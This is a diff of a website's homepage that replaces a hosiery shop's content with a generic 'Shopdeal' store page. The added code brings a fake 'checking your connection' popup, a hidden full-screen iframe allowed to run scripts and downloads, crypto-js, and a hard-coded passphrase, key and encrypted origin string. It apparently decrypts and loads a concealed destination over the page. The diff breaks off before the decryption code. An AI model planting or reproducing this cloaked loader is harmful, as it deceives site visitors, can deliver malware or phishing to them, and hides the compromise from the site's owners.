@@ -1,703 +1,749 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Artisanal Fuzzy Stockings & Haute Hosiery — Fuzzystocking</title>
-  <meta name="description" content="Engineered on precision 240-needle cylinders from double-mercerized Egyptian Giza cotton and 18.5-micron superfine Australian merino wool with hand-linked seamless toes.">
-  <link rel="canonical" href="https://fuzzystocking.com/">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Help0x0x-TD</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,400;0,600;0,700;1,400&family=Plus+Jakarta+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="/assets/css/style.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+
+  <style>
+  
+    :root{
+      --ink:#0b1020;
+      --muted:#64748b;
+      --line:#e9ebf2;
+      --surface:#f8fafc;
+      --brand:#6d28d9;
+      --brand-dark:#5b21b6;
+      --accent:#db2777;
+      --radius:18px;
+      --shadow-sm:0 1px 2px rgba(16,24,40,.06), 0 1px 3px rgba(16,24,40,.08);
+      --shadow-md:0 12px 30px -14px rgba(16,24,40,.22);
+      --shadow-lg:0 28px 60px -24px rgba(16,24,40,.32);
+      --max:1180px;
+    }
+
+    *,*::before,*::after{ box-sizing:border-box; }
+    html{ scroll-behavior:smooth; }
+    body{
+      margin:0;
+      font-family:'Inter',system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
+      color:var(--ink);
+      background:#fff;
+      line-height:1.6;
+      -webkit-font-smoothing:antialiased;
+    }
+    img{ max-width:100%; display:block; }
+    a{ color:inherit; text-decoration:none; }
+    button{ font:inherit; }
+    ul{ list-style:none; margin:0; padding:0; }
+
+    .container{ width:min(var(--max), 100% - 48px); margin-inline:auto; }
+
+    /* ============================================================
+       LOADING POPUP
+       ============================================================ */
+    .popup{
+      position:fixed; inset:0; z-index:9999;
+      display:flex; align-items:center; justify-content:center;
+      background:#fff; padding:24px;
+    }
+    .popup-content{
+      width:100%; max-width:560px;
+      text-align:center;
+      animation:popIn .5s cubic-bezier(.2,.8,.3,1) both;
+    }
+    @keyframes popIn{
+      from{ opacity:0; transform:translateY(14px) scale(.98); }
+      to{ opacity:1; transform:none; }
+    }
+    .loading-gif{
+      width:120px; height:120px;
+      margin:0 auto 26px;
+    }
+    .popup-title{
+      font-size:clamp(1.3rem,2.6vw,1.6rem);
+      font-weight:800; letter-spacing:-.025em;
+      margin:0 0 8px;
+    }
+    .popup-content p.sub{
+      margin:0 0 32px;
+      color:var(--muted);
+      font-size:.95rem;
+      font-weight:500;
+    }
+    .buttons{
+      display:flex; justify-content:center; gap:14px; flex-wrap:wrap;
+    }
+    .buttons button{
+      min-width:152px;
+      padding:14px 30px;
+      border:0; border-radius:13px;
+      cursor:pointer; font-weight:700; font-size:1rem;
+      transition:transform .18s ease, box-shadow .18s ease, background .18s ease;
+    }
+    #cancelBtn{ background:#f1f5f9; color:#334155; }
+    #cancelBtn:hover{ background:#e2e8f0; }
+    #continueBtn{
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      color:#fff;
+      box-shadow:0 16px 30px -14px rgba(109,40,217,.85);
+    }
+    #continueBtn:hover{ transform:translateY(-2px); }
+
+    .hint{
+      background:linear-gradient(90deg,#1e1b4b,#4c1d95 45%,#831843);
+      color:#ede9fe;
+      text-align:center;
+      font-size:.82rem;
+      font-weight:600;
+      letter-spacing:.02em;
+      padding:11px 20px;
+      min-height:42px;
+      display:flex; align-items:center; justify-content:center;
+      gap:10px;
+    }
+
+    .nav{
+      position:sticky; top:0; z-index:80;
+      display:flex; align-items:center; gap:26px;
+      height:72px;
+      padding:0 max(24px, calc((100vw - var(--max)) / 2));
+      background:rgba(255,255,255,.86);
+      backdrop-filter:blur(16px);
+      -webkit-backdrop-filter:blur(16px);
+      border-bottom:1px solid var(--line);
+    }
+    .brand{
+      display:flex; align-items:center; gap:11px;
+      font-weight:800; font-size:1.12rem;
+      letter-spacing:-.025em; white-space:nowrap;
+    }
+    .brand-mark{
+      width:36px; height:36px; flex:none;
+      display:grid; place-items:center;
+      border-radius:11px; font-size:1rem;
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      box-shadow:0 10px 22px -10px rgba(109,40,217,.9);
+    }
+
+    .links{ display:flex; gap:6px; }
+    .links a{
+      font-size:.9rem; font-weight:500; color:#4b5563;
+      padding:8px 14px; border-radius:10px;
+      transition:color .18s ease, background .18s ease;
+    }
+    .links a:hover{ color:var(--brand); background:#f5f3ff; }
+
+    .clock{
+      margin-left:auto;
+      display:inline-flex; align-items:center; gap:6px;
+      font-size:.78rem; font-weight:600; color:var(--brand-dark);
+      background:#f5f3ff; border:1px solid #ede9fe;
+      padding:7px 13px; border-radius:999px; white-space:nowrap;
+    }
+    .cart-btn{
+      display:inline-flex; align-items:center; gap:8px;
+      border:0; cursor:pointer;
+      background:var(--ink); color:#fff;
+      font-weight:600; font-size:.88rem;
+      padding:10px 18px; border-radius:999px;
+      transition:transform .18s ease, background .18s ease;
+    }
+    .cart-btn:hover{ background:var(--brand); transform:translateY(-1px); }
+    .cart-btn .badge{
+      background:#fff; color:var(--ink);
+      border-radius:999px; min-width:20px; height:20px;
+      display:grid; place-items:center;
+      padding:0 6px; font-size:.72rem; font-weight:800;
+    }
+
+    @media (max-width:900px){
+      .links{ display:none; }
+      .clock{ display:none; }
+    }
+    @media (max-width:560px){
+      .nav{ gap:14px; height:66px; padding-inline:18px; }
+      .cart-btn{ padding:9px 14px; font-size:.82rem; }
+    }
+
+    /* ============================================================
+       HERO
+       ============================================================ */
+    .hero{
+      display:grid;
+      grid-template-columns:1.03fr .97fr;
+      gap:60px; align-items:center;
+      padding:76px max(24px, calc((100vw - var(--max)) / 2)) 68px;
+      background:
+        radial-gradient(900px 420px at 8% -20%, rgba(109,40,217,.14), transparent 62%),
+        radial-gradient(760px 420px at 98% -6%, rgba(219,39,119,.12), transparent 58%),
+        linear-gradient(180deg,#fbfaff,#fff);
+    }
+    @media (max-width:960px){
+      .hero{ grid-template-columns:1fr; gap:44px; padding-top:52px; padding-bottom:52px; }
+    }
+
+    .eyebrow{
+      display:inline-flex; align-items:center; gap:8px;
+      background:#fff; border:1px solid #ede9fe;
+      color:var(--brand-dark);
+      font-size:.78rem; font-weight:700;
+      letter-spacing:.06em; text-transform:uppercase;
+      padding:7px 15px; border-radius:999px;
+      box-shadow:var(--shadow-sm);
+      margin-bottom:20px;
+    }
+    .eyebrow .dot{
+      width:7px; height:7px; border-radius:50%;
+      background:var(--accent);
+      box-shadow:0 0 0 4px rgba(219,39,119,.16);
+    }
+
+    .hero-text h1{
+      font-size:clamp(2.2rem,5vw,3.4rem);
+      line-height:1.08; letter-spacing:-.035em;
+      font-weight:900; margin:0 0 18px;
+    }
+    .hero-text h1 span{
+      background:linear-gradient(115deg,var(--brand),var(--accent));
+      -webkit-background-clip:text; background-clip:text; color:transparent;
+    }
+    .hero-text p{
+      font-size:1.05rem; color:var(--muted);
+      max-width:490px; margin:0 0 30px;
+    }
+
+    .cta{
+      display:inline-flex; align-items:center; gap:9px;
+      padding:15px 30px; border-radius:999px;
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      color:#fff; font-weight:700; font-size:.95rem;
+      box-shadow:0 16px 32px -16px rgba(109,40,217,.9);
+      transition:transform .18s ease, box-shadow .18s ease;
+    }
+    .cta:hover{ transform:translateY(-2px); box-shadow:0 22px 40px -18px rgba(109,40,217,.95); }
+
+    .hero-stats{
+      display:flex; gap:34px; flex-wrap:wrap;
+      margin-top:40px; padding-top:26px;
+      border-top:1px solid var(--line);
+    }
+    .hero-stats strong{
+      display:block; font-size:1.35rem; font-weight:800; letter-spacing:-.02em;
+    }
+    .hero-stats span{ font-size:.82rem; color:var(--muted); }
+
+    .hero-img{
+      width:100%; aspect-ratio:5/4; object-fit:cover;
+      border-radius:26px;
+      box-shadow:var(--shadow-lg);
+    }
+
+    /* ============================================================
+       TRUST STRIP
+       ============================================================ */
+    .trust{
+      border-block:1px solid var(--line);
+      background:var(--surface);
+    }
+    .trust-grid{
+      display:grid; grid-template-columns:repeat(4,1fr);
+      gap:10px; padding:22px 0;
+    }
+    .trust-item{
+      display:flex; align-items:center; justify-content:center; gap:9px;
+      font-size:.85rem; font-weight:600; color:#475569;
+      padding:6px 10px; border-right:1px solid var(--line);
+    }
+    .trust-item:last-child{ border-right:0; }
+    .trust-item span{ font-size:1.05rem; }
+    @media (max-width:860px){
+      .trust-grid{ grid-template-columns:repeat(2,1fr); gap:14px; }
+      .trust-item{ border-right:0; justify-content:flex-start; }
+    }
+
+    /* ============================================================
+       SECTIONS
+       ============================================================ */
+    .section{ padding:76px 0; }
+    .section-head{ text-align:center; max-width:640px; margin:0 auto 42px; }
+    .section-head .kicker{
+      display:inline-block;
+      font-size:.76rem; font-weight:800;
+      letter-spacing:.12em; text-transform:uppercase;
+      color:var(--brand); margin-bottom:10px;
+    }
+    .section-head h2{
+      font-size:clamp(1.6rem,3.2vw,2.2rem);
+      font-weight:900; letter-spacing:-.03em;
+      margin:0 0 10px; line-height:1.15;
+    }
+    .section-head p{ margin:0; color:var(--muted); font-size:.97rem; }
+
+
+    .grid{
+      display:grid; gap:24px;
+      grid-template-columns:repeat(auto-fill,minmax(250px,1fr));
+    }
+    .card{
+      display:flex; flex-direction:column;
+      background:#fff; border:1px solid var(--line);
+      border-radius:var(--radius); overflow:hidden;
+      transition:transform .22s ease, box-shadow .22s ease, border-color .22s ease;
+    }
+    .card:hover{
+      transform:translateY(-6px);
+      box-shadow:var(--shadow-lg);
+      border-color:transparent;
+    }
+    .card-media{
+      position:relative; aspect-ratio:4/3;
+      overflow:hidden; background:#f1f5f9;
+    }
+    .card-media img{
+      width:100%; height:100%; object-fit:cover;
+      transition:transform .55s cubic-bezier(.2,.7,.3,1);
+    }
+    .card:hover .card-media img{ transform:scale(1.07); }
+
+    .card .badge{
+      position:absolute; top:12px; left:12px;
+      font-size:.68rem; font-weight:800; letter-spacing:.06em;
+      text-transform:uppercase; color:#fff;
+      padding:6px 11px; border-radius:999px;
+      background:var(--ink);
+    }
+    .card .badge--sale{ background:var(--accent); }
+    .card .badge--new{ background:#0ea5e9; }
+
+    .card .body{
+      padding:16px 18px 18px;
+      display:flex; flex-direction:column; flex:1;
+    }
+    .card .cat{
+      font-size:.7rem; font-weight:700; letter-spacing:.1em;
+      text-transform:uppercase; color:#94a3b8; margin-bottom:6px;
+    }
+    .card h3{
+      margin:0 0 8px; font-size:1rem; font-weight:700; letter-spacing:-.015em;
+    }
+    .price-row{
+      display:flex; align-items:baseline; gap:8px;
+      margin-top:auto; padding-top:6px;
+    }
+    .card .price{
+      font-size:1.12rem; font-weight:800;
+      letter-spacing:-.02em; color:var(--ink);
+    }
+    .card .old{
+      font-size:.85rem; color:#a3aab8;
+      text-decoration:line-through; font-weight:500;
+      margin:0;
+    }
+    .save{
+      margin-left:auto;
+      font-size:.7rem; font-weight:800;
+      color:#047857; background:#ecfdf5;
+      padding:3px 8px; border-radius:999px;
+    }
+
+    .add{
+      margin-top:14px; width:100%;
+      display:inline-flex; align-items:center; justify-content:center; gap:8px;
+      border:1px solid var(--ink); background:#fff; color:var(--ink);
+      font-weight:700; font-size:.88rem;
+      padding:11px; border-radius:11px; cursor:pointer;
+      transition:background .2s ease, color .2s ease, transform .18s ease;
+    }
+    .add:hover{ background:var(--ink); color:#fff; transform:translateY(-1px); }
+    .add:active{ transform:translateY(0); }
+
+  
+    .about{
+      background:var(--surface);
+      border-block:1px solid var(--line);
+    }
+    .features{
+      display:grid; gap:22px;
+      grid-template-columns:repeat(auto-fit,minmax(210px,1fr));
+    }
+    .feature{
+      background:#fff; border:1px solid var(--line);
+      border-radius:var(--radius);
+      padding:28px 24px;
+      text-align:left;
+      transition:transform .22s ease, box-shadow .22s ease;
+    }
+    .feature:hover{ transform:translateY(-4px); box-shadow:var(--shadow-md); }
+    .feature span{
+      display:grid; place-items:center;
+      width:48px; height:48px;
+      border-radius:14px; font-size:1.3rem;
+      background:linear-gradient(135deg,#f5f3ff,#fdf2f8);
+      border:1px solid #ede9fe;
+      margin-bottom:16px;
+    }
+    .feature h3{ margin:0 0 6px; font-size:1rem; font-weight:800; letter-spacing:-.015em; }
+    .feature p{ margin:0; color:var(--muted); font-size:.87rem; line-height:1.55; }
+
+    /* ============================================================
+       FOOTER
+       ============================================================ */
+    .footer{
+      background:#0b1020;
+      color:#94a3b8;
+      text-align:center;
+      padding:44px 24px;
+      font-size:.85rem;
+    }
+    .footer .fbrand{
+      display:inline-flex; align-items:center; gap:10px;
+      color:#fff; font-weight:800; font-size:1rem;
+      letter-spacing:-.02em; margin-bottom:10px;
+    }
+    .footer p{ margin:0 0 6px; }
+    .footer small{ color:#64748b; font-size:.78rem; }
+
+  
+    @media (prefers-reduced-motion:reduce){
+      *{ animation-duration:.001ms !important; transition-duration:.001ms !important; }
+      html{ scroll-behavior:auto; }
+    }
+  </style>
+
   <!-- Google tag (gtag.js) -->
   <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
   <script>
     window.dataLayer = window.dataLayer || [];
     function gtag(){dataLayer.push(arguments);}
     gtag('js', new Date());
+
     gtag('config', 'G-0LY0HY7L01');
   </script>
 
+<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
+
 </head>
 <body>
-  <!-- Top Announcement Bar (Paid E-Commerce Theme) -->
-  <div class="announcement-bar">
-    <span>◈ COMPLIMENTARY EXPRESS DELIVERY ON ORDERS $60+ &bull; 100-DAY BLISTER-FREE GUARANTEE &bull; DISPATCHED FROM 181 MERCER STREET</span>
-  </div>
 
-  <!-- Mandatory Global Site Header (Exactly 1 per page) -->
-  <header class="site-header">
-    <div class="header-container">
-      <a href="/" class="brand-logo" aria-label="Fuzzystocking Home">
-        <span class="logo-mark">◈</span>
-        <span class="logo-text">Fuzzystocking</span>
-      </a>
-      <nav class="desktop-nav" aria-label="Primary Navigation">
-        <a href="/" class="nav-link active">Home</a>
-        <a href="/about.html" class="nav-link">The Atelier</a>
-        <a href="/collection.html" class="nav-link">Collections</a>
-        <a href="/blog.html" class="nav-link">Treatises</a>
-        <a href="/contact.html" class="nav-link">Concierge</a>
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <h2 class="popup-title">Loading... Please wait.</h2>
+      <p class="sub">We're checking your connection.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
+      </div>
+    </div>
+  </div>
+  
+  <div id="shop">
+    <div class="hint">🛍️ Shopdeal — Summer Sale is live · Up to 50% off</div>
+
+    <header class="nav">
+      <div class="brand"><span class="brand-mark">🛍️</span> Shopdeal</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
       </nav>
-      <div class="header-actions">
-        <a href="/collection.html" class="btn btn-sm btn-outline">Explore Catalog</a>
-        <button id="drawer-toggle" class="mobile-toggle" aria-label="Open Navigation Menu">
-          <span class="hamburger-bar"></span>
-          <span class="hamburger-bar"></span>
-          <span class="hamburger-bar"></span>
-        </button>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
+    </header>
+
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <span class="eyebrow"><span class="dot"></span> Summer Sale · Up to 50% Off</span>
+        <h1>Everyday essentials, <span>beautifully priced.</span></h1>
+        <p>Trendy products, free stock photos, all on a single page. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now →</a>
+
+        <div class="hero-stats">
+          <div><strong>12,480+</strong><span>Happy customers</span></div>
+          <div><strong>4.9 / 5</strong><span>Average rating</span></div>
+          <div><strong>48 hrs</strong><span>US delivery</span></div>
+        </div>
+      </div>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/900/720" alt="hero" />
+    </section>
+
+    <!-- Histats.com  START  (aync)-->
+   <!--  <script type="text/javascript">var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();</script>
+    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript> -->
+    <!-- Histats.com  END  -->
+
+    <!-- Trust strip -->
+    <div class="trust">
+      <div class="container trust-grid">
+        <div class="trust-item"><span>🚚</span> Free shipping $75+</div>
+        <div class="trust-item"><span>↩️</span> 30-day returns</div>
+        <div class="trust-item"><span>🔒</span> Secure checkout</div>
+        <div class="trust-item"><span>💬</span> 7-day support</div>
       </div>
     </div>
-  </header>
 
-  <!-- Mandatory Mobile Navigation Drawer (Exactly 1 per page) -->
-  <div class="mobile-drawer" id="mobile-drawer" aria-hidden="true">
-    <div class="drawer-header">
-      <div class="drawer-brand">Fuzzystocking</div>
-      <button id="drawer-close" class="drawer-close-btn" aria-label="Close Navigation Menu">&times;</button>
-    </div>
-    <nav class="drawer-nav" aria-label="Mobile Navigation">
-      <a href="/" class="drawer-link active">Home</a>
-      <a href="/about.html" class="drawer-link">The Atelier &amp; Craft</a>
-      <a href="/collection.html" class="drawer-link">Sartorial Hosiery Collection</a>
-      <a href="/blog.html" class="drawer-link">Sartorial Treatises</a>
-      <a href="/contact.html" class="drawer-link">Private Concierge</a>
-    </nav>
-    <div class="drawer-footer">
-      <p class="drawer-contact-title">Manhattan Atelier &amp; Suite</p>
-      <p class="drawer-contact-info">181 Mercer Street, New York, NY 10012, United States</p>
-      <p class="drawer-contact-info">Tel: +1-888-777-5845</p>
-      <p class="drawer-contact-info">Email: concierge@fuzzystocking.com</p>
-    </div>
+    <section class="section" id="products">
+      <div class="container">
+        <div class="section-head">
+          <span class="kicker">Featured</span>
+          <h2>Handpicked for you</h2>
+          <p>Six customer favorites, priced in USD — with free shipping on qualifying orders.</p>
+        </div>
+
+        <div class="grid">
+          <article class="card">
+            <div class="card-media">
+              <span class="badge badge--sale">Best Seller</span>
+              <img src="https://picsum.photos/seed/shopdeal-sneakers/600/450" alt="Running Sneakers" />
+            </div>
+            <div class="body">
+              <span class="cat">Footwear</span>
+              <h3>Running Sneakers</h3>
+              <div class="price-row">
+                <span class="price">$89.99</span>
+                <span class="old">$139.99</span>
+                <span class="save">−36%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <span class="badge">Limited</span>
+              <img src="https://picsum.photos/seed/shopdeal-watch/600/450" alt="Classic Watch" />
+            </div>
+            <div class="body">
+              <span class="cat">Accessories</span>
+              <h3>Classic Watch</h3>
+              <div class="price-row">
+                <span class="price">$179.99</span>
+                <span class="old">$249.99</span>
+                <span class="save">−28%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <img src="https://picsum.photos/seed/shopdeal-backpack/600/450" alt="Travel Backpack" />
+            </div>
+            <div class="body">
+              <span class="cat">Bags</span>
+              <h3>Travel Backpack</h3>
+              <div class="price-row">
+                <span class="price">$69.99</span>
+                <span class="old">$109.99</span>
+                <span class="save">−36%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <span class="badge badge--new">New</span>
+              <img src="https://picsum.photos/seed/shopdeal-headphones/600/450" alt="Wireless Headphones" />
+            </div>
+            <div class="body">
+              <span class="cat">Audio</span>
+              <h3>Wireless Headphones</h3>
+              <div class="price-row">
+                <span class="price">$119.99</span>
+                <span class="old">$179.99</span>
+                <span class="save">−33%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <img src="https://picsum.photos/seed/shopdeal-sunglasses/600/450" alt="Sunglasses" />
+            </div>
+            <div class="body">
+              <span class="cat">Eyewear</span>
+              <h3>Sunglasses</h3>
+              <div class="price-row">
+                <span class="price">$34.99</span>
+                <span class="old">$59.99</span>
+                <span class="save">−42%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <span class="badge">Top Rated</span>
+              <img src="https://picsum.photos/seed/shopdeal-camera/600/450" alt="Instant Camera" />
+            </div>
+            <div class="body">
+              <span class="cat">Photography</span>
+              <h3>Instant Camera</h3>
+              <div class="price-row">
+                <span class="price">$219.99</span>
+                <span class="old">$299.99</span>
+                <span class="save">−27%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+        </div>
+      </div>
+    </section>
+
+    <section id="about" class="section about">
+      <div class="container">
+        <div class="section-head">
+          <span class="kicker">Why Shopdeal</span>
+          <h2>Built around you</h2>
+          <p>Simple pricing, fast delivery and support that actually answers.</p>
+        </div>
+
+        <div class="features">
+          <div class="feature">
+            <span>🚚</span>
+            <h3>Free Shipping</h3>
+            <p>Free standard delivery on every US order over $75. No codes needed.</p>
+          </div>
+          <div class="feature">
+            <span>↩️</span>
+            <h3>Easy Returns</h3>
+            <p>30-day, no-questions-asked returns with a prepaid shipping label.</p>
+          </div>
+          <div class="feature">
+            <span>🔒</span>
+            <h3>Secure Checkout</h3>
+            <p>256-bit SSL encryption and PCI-compliant payment processing.</p>
+          </div>
+          <div class="feature">
+            <span>⚡</span>
+            <h3>Fast Support</h3>
+            <p>Real humans, 7 days a week — average reply time under 2 hours.</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <footer class="footer">
+      <div class="fbrand"><span class="brand-mark">🛍️</span> Shopdeal</div>
+      <p>© 2026 Shopdeal · Single-page demo store</p>
+      <small>Images: picsum.photos</small>
+    </footer>
   </div>
-  <div id="drawer-overlay" class="drawer-overlay"></div>
 
-  <!-- SECTION 1: PAID THEME SPLIT HERO WITH QUICK CTA & SOCIAL PROOF -->
-  <section class="section" style="padding: 4.5rem 0 5rem; background: linear-gradient(180deg, #F5F2EA 0%, #FAF9F5 100%);">
-    <div class="container">
-      <div style="display: grid; grid-template-columns: 1.1fr 1fr; gap: 4rem; align-items: center;">
-        <div>
-          <span style="display: inline-block; background: #FDF4ED; color: var(--color-dew); border: 1px solid rgba(192, 86, 33, 0.25); padding: 0.35rem 0.95rem; font-size: 0.78rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.06em; border-radius: 50px; margin-bottom: 1.2rem;">
-            AUTUMN INTARSIA &bull; 200-NEEDLE CAPSULE
-          </span>
-          <h1 style="margin-bottom: 1.2rem; font-size: clamp(2.4rem, 4.5vw, 3.8rem); line-height: 1.15; color: #121417;">
-            The Pinnacle of Artisanal Fuzzy Stockings & Comfort
-          </h1>
-          <p class="lead" style="margin-bottom: 1.8rem; font-size: 1.12rem; line-height: 1.75; color: #33383F;">
-            Engineered on precision 240-needle cylinders from double-mercerized Egyptian Giza cotton and 18.5-micron superfine Australian merino wool with hand-linked seamless toes.
-          </p>
-          <div style="display: flex; gap: 1rem; flex-wrap: wrap; margin-bottom: 2.2rem; font-size: 0.88rem; color: #4B5563;">
-            <span style="display: flex; align-items: center; gap: 0.4rem;"><strong>◈</strong> 200-Needle Lonati Knit</span>
-            <span style="display: flex; align-items: center; gap: 0.4rem;"><strong>◈</strong> Quad Silicone Heel Lock</span>
-            <span style="display: flex; align-items: center; gap: 0.4rem;"><strong>◈</strong> Hand-Linked Seamless Toe</span>
-          </div>
-          <div style="display: flex; gap: 1.2rem; flex-wrap: wrap; align-items: center; margin-bottom: 2.5rem;">
-            <a href="/collection.html" class="btn btn-gold">Shop Footie Capsule &rarr;</a>
-            <a href="/about.html" class="btn btn-outline">The Mercer St Atelier</a>
-          </div>
-          <div style="display: flex; align-items: center; gap: 1rem; padding-top: 1.5rem; border-top: 1px solid var(--color-border);">
-            <div style="color: #D97706; font-size: 1.1rem; letter-spacing: 0.1em;">★★★★★</div>
-            <div style="font-size: 0.86rem; color: #4B5563;">
-              <strong>4.98 / 5.0 Rating</strong> &bull; Over 14,000+ Verified Steps in Manhattan &amp; Beyond
-            </div>
-          </div>
-        </div>
-        <div style="position: relative;">
-          <div style="border-radius: var(--radius-md); overflow: hidden; box-shadow: var(--shadow-lg); border: 1px solid var(--color-border); background: #FFF;">
-            <img src="/assets/images/alpaca_fleece_fiber.jpg" alt="Fuzzystocking flagship jacquard footie" style="width: 100%; height: auto;">
-          </div>
-          <div style="position: absolute; bottom: -1rem; left: 1.5rem; background: #FFFFFF; border: 1px solid var(--color-border); padding: 0.85rem 1.4rem; border-radius: var(--radius-sm); box-shadow: var(--shadow-md); display: flex; align-items: center; gap: 0.8rem;">
-            <span style="font-size: 1.3rem;">🛡️</span>
-            <div>
-              <div style="font-size: 0.82rem; font-weight: 700; color: #121417; text-transform: uppercase;">100-Day Blister-Free Guarantee</div>
-              <div style="font-size: 0.75rem; color: #6B7280;">Zero-slip grip or full replacement</div>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
 
-  <!-- SECTION 2: E-COMMERCE VALUE PROP & TRUST BAR -->
-  <section class="trust-bar">
-    <div class="container">
-      <div class="trust-grid">
-        <div class="trust-item">
-          <div class="trust-icon-box">🔒</div>
-          <div>
-            <div class="trust-title">Zero-Slip Quad Heel Grip</div>
-            <p class="trust-desc">Hexagonal medical-grade silicone waves anchor firmly to your calcaneus without slipping.</p>
-          </div>
-        </div>
-        <div class="trust-item">
-          <div class="trust-icon-box">✨</div>
-          <div>
-            <div class="trust-title">Hand-Linked Seamless Toe</div>
-            <p class="trust-desc">Every loop linked manually by artisans for a completely flat 0.0mm ridge-free toe box.</p>
-          </div>
-        </div>
-        <div class="trust-item">
-          <div class="trust-icon-box">🌿</div>
-          <div>
-            <div class="trust-title">Combed Giza &amp; Merino Blends</div>
-            <p class="trust-desc">Natural vapor absorption preventing sweat condensation, friction hotspots, and odor.</p>
-          </div>
-        </div>
-        <div class="trust-item">
-          <div class="trust-icon-box">📍</div>
-          <div>
-            <div class="trust-title">Manhattan Atelier Dispatch</div>
-            <p class="trust-desc">Same-day courier and concierge dispatch from our flagship salon at 181 Mercer Street.</p>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
+  <div id="contentiframe" style="display:none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+  <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen
+    webkitallowfullscreen mozallowfullscreen
+    sandbox="allow-pointer-lock allow-scripts allow-popups allow-forms allow-downloads"
+    style="width:100%; height:100%; border:0;"></iframe>
+</div>
 
-  <!-- SECTION 3: FLAGSHIP PRODUCT VITRINE (PAID THEME PRODUCT CARDS) -->
-  <section class="section">
-    <div class="container">
-      <div class="section-header text-center">
-        <div class="section-subtitle">Curated Capsule Drops</div>
-        <h2>Bestselling Jacquard Footie Editions</h2>
-        <p class="text-muted" style="max-width: 680px; margin: 0.8rem auto 0;">
-          Precision-tailored low-cut silhouettes engineered to remain completely hidden beneath loafers, sneakers, and boat shoes while providing all-day orthopedic comfort.
-        </p>
-      </div>
-      <div class="grid-4">
-        <!-- Product 1 -->
-        <div class="paid-product-card">
-          <span class="paid-product-badge">Best Seller</span>
-          <div class="paid-product-img-wrap">
-            <img src="/assets/images/blog_200_needle_knit.jpg" alt="The Mercer Heritage Intarsia Footie">
-          </div>
-          <div class="paid-product-body">
-            <div class="paid-product-rating">★★★★★ <span>(184)</span></div>
-            <div class="paid-product-title">The Mercer Heritage Intarsia</div>
-            <div class="paid-product-price">
-              <span class="price-current">$24.00</span>
-              <span class="price-original">$32.00</span>
-            </div>
-            <p style="font-size: 0.85rem; color: #4B5563; margin-bottom: 0.6rem;">Double-mercerized Egyptian cotton with artisanal geometric jacquard medallions.</p>
-            <div class="swatch-group">
-              <span class="swatch-dot" style="background: #D4AF37;"></span>
-              <span class="swatch-dot" style="background: #2D3748;"></span>
-              <span class="swatch-dot" style="background: #8C4A2F;"></span>
-            </div>
-            <a href="/collection.html" class="btn btn-sm btn-outline" style="margin-top: auto; width: 100%; text-align: center;">View Silhouette &rarr;</a>
-          </div>
-        </div>
+<script>
+  const PASSPHRASE = "98yNCjeAfWMwk0wI";
+  const URL_KEY   = "UrLk3yShopEase01";
+  const ENC_DATA_ORIGIN = "U2FsdGVkX1/MLFDsKLUGWPEULKMoI3z6OMEfHjl0yjxz+rEtyoDJt+fOL8LFVi27";
 
-        <!-- Product 2 -->
-        <div class="paid-product-card">
-          <span class="paid-product-badge">High Performance</span>
-          <div class="paid-product-img-wrap">
